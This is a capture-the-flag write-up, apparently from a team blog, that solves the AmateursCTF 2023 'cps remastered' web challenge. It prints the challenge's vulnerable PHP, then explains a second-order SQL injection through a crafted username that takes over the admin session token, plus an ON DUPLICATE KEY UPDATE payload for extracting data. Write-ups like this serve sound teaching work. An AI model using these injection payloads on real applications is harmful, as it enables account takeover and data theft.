---
layout: post
title: AmateursCTF 2023
author: Protag
categories: [Jeopardy]
tags: [ctf,web,sqli]
---

# cps remastered
![screenshot of challenge description]({{ site.baseurl }}/images/amateursctf/cps.png)

The description is already hinting at SQL injection so we know what we're getting into here

It didnt take too long to spot the SQLi in register.php
```php
<?php
    $message = "";
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
    if (isset($_POST["username"]) && isset($_POST["password"])) {
        try{
            $mysqli = new mysqli("p:db", "app", "ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5", "cps");
            $result = $mysqli->query(sprintf("INSERT INTO users (username, password) VALUES ('%s', '%s')", $_POST["username"], $_POST["password"]));
            if ($result) {
                $token = bin2hex(random_bytes(16));
                $add_token = $mysqli->query(sprintf("INSERT INTO tokens (token, username) VALUES ('%s', '%s')", $token, $_POST["username"]));
                if ($add_token) {
                    setcookie("token", $token);
                    $message = "<p>Successfully created account. You are now logged in</p>";
                }
            } else {
                $message = "<p>Something went wrong. Username " + $_POST["username"] + " (might) have been taken already</p>";
            }
        } catch (Exception $e) {
            if (str_starts_with($e, "mysqli_sql_exception: Duplicate entry '") and str_contains($e, "' for key 'PRIMARY'")) {
                $message = sprintf("<p>Something went wrong. Username starting with %s has been taken already</p>", substr(explode("' for key", substr($e, 39))[0], 0, 5));
            }
        }

    }
?>
```

I thought we could update password field using the insert query however the permissions for the SQL user only allow us to update the best_cps column.


```sql
CREATE USER 'app' @'%' IDENTIFIED BY 'ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5';
GRANT SELECT ON cps.* TO 'app' @'%';
GRANT INSERT ON cps.* TO 'app' @'%';
GRANT UPDATE (best_cps) ON cps.users TO 'app' @'%';
FLUSH PRIVILEGES;
```

So instead let's look at this other SQLi in login.php

```php
<?php
    $message = "";
    mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
    if (isset($_POST["username"]) && isset($_POST["password"])) {
        $mysqli = new mysqli("p:db", "app", "ead549a4a7c448926bfe5d0488e1a736798a9a8ee150418d27414bd02d37b9e5", "cps");
        $stmt = $mysqli->prepare("SELECT username, password FROM users WHERE username = ? AND password = ?");
        $stmt->bind_param("ss", $_POST["username"], $_POST["password"]);
        $stmt->execute();
        $result = $stmt->get_result();
        $row = $result->fetch_assoc();
        if ($row) {
            $token = bin2hex(random_bytes(16));
            $add_token = $mysqli->query(sprintf("INSERT INTO tokens (token, username) VALUES ('%s', '%s')", $token, $_POST["username"]));
            if ($add_token) {
                setcookie("token", $token);
                echo "<p>You are now logged in</p>";
            }
        } else {
            echo "<p>Something went wrong.</p>";
        }

    }
?>
```

On first glance it might seem like we can't exploit the SQLi in the INSERT query however if we register an account with our payload as it's username we can reach the vulnerable query.

So register a user with the username `admin\');-- -` - we need to escape the quote as register.php itself is injectable.

Afterwards log in as the user we just created and we get the flag on the index (flag was password of admin user).

What our injection does here is make the token we have the token for the admin user instead of the user we created.

Flag: `amateursCTF{h0w_f@st_can_you_cl1ck?}`

![screen shot of flag on cps]({{ site.baseurl }}/images/amateursctf/cpsflagged.png)

## Other notes from cps remastered
The intended solution was to extract the flag bit by bit using boolean based blind.

If we did have UPDATE permissions for password column we could extract data through the password field in our INSERT query like this:

Username: myuser

Password: `xd'),('myuser','derp') ON DUPLICATE KEY UPDATE password=@@version-- -`

Query: 
```sql
INSERT INTO users (username, password) VALUES ('myuser', 'xd'),('myuser','derp') ON DUPLICATE KEY UPDATE password=@@version-- -')
```

While exploiting this you may get an error like:
`Error in query (1093): Table ‘users’ is specified twice, both as a target for ‘INSERT’ and as a separate source for data`

You can work around this issue using subqueries:
```sql
xd'),('myuser','derp') ON DUPLICATE KEY UPDATE password=(SELECT t.password FROM (SELECT * FROM users t WHERE t.username='admin') as t)-- -
```

